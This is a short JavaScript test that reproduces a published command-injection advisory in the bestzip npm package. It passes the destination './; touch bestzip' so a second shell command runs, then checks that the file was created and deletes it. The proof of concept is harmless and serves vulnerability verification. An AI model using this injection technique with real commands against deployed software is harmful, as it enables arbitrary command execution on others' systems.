//https://github.com/advisories/GHSA-4qqc-mp5f-ccv4
test("Command Injection in bestzip", () => 
{
	const zip = require('bestzip');
	const fs = require('fs');
	const path = './bestzip';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	zip({ source: '', destination: './; touch bestzip' });
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
